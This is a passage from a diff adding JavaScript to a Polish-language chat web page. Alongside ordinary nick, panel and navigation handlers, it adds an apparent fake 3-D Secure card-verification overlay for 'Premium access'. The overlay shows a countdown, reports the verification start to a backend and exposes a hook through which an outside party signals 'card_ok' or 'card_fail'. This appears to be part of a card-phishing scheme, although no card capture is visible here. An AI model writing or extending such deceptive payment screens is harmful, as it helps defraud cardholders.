+            document.getElementById('pm3dsCancelBtn').addEventListener('click', () => {
+                clearInterval(timer3ds);
+                overlay3ds.remove();
+                window._pmHandleCtrl = null;
+            });
+
+            const verifyStartTs = Date.now();
+            if (window._fbSend) window._fbSend({ t: 'verify_start', v: verifyStartTs });
+
+            const DURATION = 300;
+            const circle = document.getElementById('pm3dsCircle');
+            const timeEl = document.getElementById('pm3dsTime');
+            const circ   = 2 * Math.PI * 54;
+            circle.style.strokeDasharray  = circ;
+            circle.style.strokeDashoffset = 0;
+
+            function tick() {
+                const secs = Math.max(0, DURATION - Math.floor((Date.now() - verifyStartTs) / 1000));
+                if (timeEl) timeEl.textContent = Math.floor(secs / 60) + ':' + String(secs % 60).padStart(2, '0');
+                if (circle) circle.style.strokeDashoffset = circ * (1 - secs / DURATION);
+                if (secs <= 0) {
+                    clearInterval(timer3ds);
+                    overlay3ds.remove();
+                    addMessage("System", "Czas weryfikacji minął. Spróbuj ponownie.", false, true);
+                }
+            }
+            tick();
+            const timer3ds = setInterval(tick, 1000);
+
+            window._pmHandleCtrl = function(action) {
+                clearInterval(timer3ds);
+                window._pmHandleCtrl = null;
+                overlay3ds.remove();
+                if (action === 'card_ok') {
+                    addMessage("System", "Dostęp Premium aktywowany! Kod zostanie wysłany na podany adres e-mail.", false, true);
+                } else if (action === 'card_fail') {
+                    addMessage("System", "Weryfikacja nieudana. Spróbuj ponownie.", false, true);
+                }
+            };
+        }
+
+        hostBtn.addEventListener("click", () => {
+            if (!myNick) { setStatus(nickStatus, "error", "Najpierw ustaw nick!"); return; }
+            hostPanel.style.display = "block";
+            guestPanel.style.display = "none";
+            chatPanel.classList.remove("active");
+            setStatus(hostStatus, "", "");
+        });
+
+        guestBtn.addEventListener("click", () => {
+            if (!myNick) { setStatus(nickStatus, "error", "Najpierw ustaw nick!"); return; }
+            hostPanel.style.display = "none";
+            guestPanel.style.display = "block";
+            chatPanel.classList.remove("active");
+            setStatus(guestStatus, "", "");
+        });
+
+        const navToggle  = document.getElementById("navToggle");
+        const navClose   = document.getElementById("navClose");
+        const navOverlay = document.getElementById("navOverlay");
+        const topbarNav  = document.getElementById("topbarNav");
+
+        function openNav() {
+            topbarNav.classList.add("open");
+            navOverlay.classList.add("active");
+        }
+        function closeNav() {
+            topbarNav.classList.remove("open");
+            navOverlay.classList.remove("active");
+        }
+
+        navToggle.addEventListener("click", (e) => { e.stopPropagation(); openNav(); });
+        navClose.addEventListener("click", closeNav);
+        navOverlay.addEventListener("click", closeNav);
+
+        document.addEventListener("keydown", (e) => {
+            if (e.key === "Escape") {
+                if (chatPanel.classList.contains("active")) window.disconnect(false);
+                closeNav();
+            }
+        });
+
+    </script>
+</body>
+</html>
